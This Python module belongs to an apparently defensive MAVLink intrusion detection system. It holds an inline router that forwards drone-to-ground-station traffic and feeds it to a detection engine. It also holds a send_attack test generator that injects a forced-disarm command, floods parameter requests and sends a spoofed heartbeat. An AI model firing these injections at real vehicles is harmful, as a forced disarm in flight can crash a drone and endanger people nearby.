"""Live mode: an inline MAVLink router (vehicle <-> GCS port) that runs the IDS on both directions.

In deployment this runs on the companion computer between the flight controller's serial link and the
telemetry radio, so it sees every uplink command and downlink message. Forwarding is unmodified
(detection only); blocking (IPS mode) is on the Stage 2 roadmap.
"""

from __future__ import annotations

import threading
import time
import warnings

from pymavlink import mavutil

from ids.engine import Engine
from ids.sources import from_mavlink


def run_router(master_url: str, gcs_url: str, engine: Engine, stop: threading.Event | None = None,
               max_s: float | None = None) -> None:
    master = mavutil.mavlink_connection(master_url, source_system=250)
    gcs = mavutil.mavlink_connection(gcs_url, source_system=250)
    t_end = time.time() + max_s if max_s else None
    errors = 0
    try:
        while not (stop and stop.is_set()) and not (t_end and time.time() > t_end):
            idle = True
            for src, dst in ((master, gcs), (gcs, master)):
                try:
                    m = src.recv_match(blocking=False)
                except Exception:
                    errors += 1
                    continue
                if m is None:
                    continue
                idle = False
                # Forward first, analyse second: detection is passive, so an IDS failure or slowdown on a
                # message must never delay or drop the vehicle <-> GCS link.
                if m.get_type() != "BAD_DATA":
                    try:
                        dst.write(m.get_msgbuf())
                    except OSError:
                        pass  # peer not connected yet (udpin before first packet)
                try:
                    engine.process(from_mavlink(m, time.time()))
                except Exception as e:
                    errors += 1
                    if errors == 1:
                        warnings.warn(f"IDS analysis failed ({e!r}); router keeps forwarding")
            # Timer-driven checks catch a link outage even when the missing heartbeat
            # means no new message ever arrives to trigger the normal feed path.
            try:
                engine.tick(time.time())
            except Exception as e:
                errors += 1
                if errors == 1:
                    warnings.warn(f"IDS timer check failed ({e!r}); router keeps forwarding")
            if idle:
                time.sleep(0.01)
    finally:
        master.close()
        gcs.close()


def send_attack(target_url: str, kind: str, duration: float = 5.0, rate_hz: int = 200) -> int:
    """Lab/SITL/loopback use only."""
    sysid = 99 if kind == "flood" else 66
    conn = mavutil.mavlink_connection(target_url, source_system=sysid, source_component=1)
    sent, t_end = 0, time.time() + duration
    while time.time() < t_end:
        if kind == "inject":
            conn.mav.command_long_send(1, 1, 400, 0, 0, 21196, 0, 0, 0, 0, 0)  # forced disarm
            time.sleep(0.25)
        elif kind == "flood":
            conn.mav.param_request_list_send(1, 1)
            time.sleep(1.0 / rate_hz)
        elif kind == "rogue_heartbeat":
            conn.mav.heartbeat_send(2, 3, 129, 0, 4)
            time.sleep(0.5)
        else:
            raise ValueError(f"unknown attack kind {kind}")
        sent += 1
    conn.close()
    return sent
